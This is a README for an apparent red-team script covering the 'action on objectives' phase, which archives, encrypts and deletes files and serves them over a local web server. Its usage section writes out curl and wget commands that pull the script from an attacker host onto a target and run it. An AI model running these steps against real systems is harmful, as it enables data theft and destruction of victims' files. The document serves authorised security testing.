# Action on Objectives Phase

The last phase includes the measures that are necessary to achieve the actual goal. This includes different techniques, which are applied depending on the defined goal. For example, if data needs to be stolen, it can be copied and removed. Furthermore, techniques for encryption, manipulation, destruction of data can be applied. Another goal can be the impairment of the availability of the system.

This script serves as a tool for some specified actions like encrypt files or directories.

## Features

- Create a compressed tar archive of files or directories
- Unarchive compressed tar archive
- Encrypt files or directories
- Decrypt encrypted .gpg file

## Usage

From github:
```sh
curl -LJO https://github.com/McSquizzy/red-team-toolbox/blob/main/action-on-objectives/action-on-objectives.sh
sh action-on-objectives.sh -h
```
Local network:
```sh
# Host
sh action-on-objectives.sh -w
# Target
curl -LJO <Host>:8000/action-on-objectives.sh #or
curl <Host>:8000/action-on-objectives.sh > action-on-objectives.sh #or
wget <Host>:8000/action-on-objectives.sh
sh action-on-objectives.sh -h
```

### Parameters

```
sh action-on-objectives.sh -h

Usage: action-on-objectives.sh [options]

Options:
-h                    Show this help message
-a <file, directory>  Archive and compress given files or directory
                      Specify directories without the last /
-u <file.tar.gz>      Extract the given tar archive
-e <file, directory>  Encrypt given file or directory (symmetric encryption with password)
-d <file.gpg>         Decrypt given file
-r                    Remove the original files

-w                    Serves a local web server for transferring files

Output:
-c                    No colours. Without colours, the output can probably be read better
-q                    Quiet. No banner and no advisory displayed
```

## Results

Results are printed directly to STDOUT.

## Compatibility

The script uses /bin/sh syntax and is fully POSIX compatible so can run on most unix-based (POSIX/Unix/Linux) systems.

-----

## Additional Information
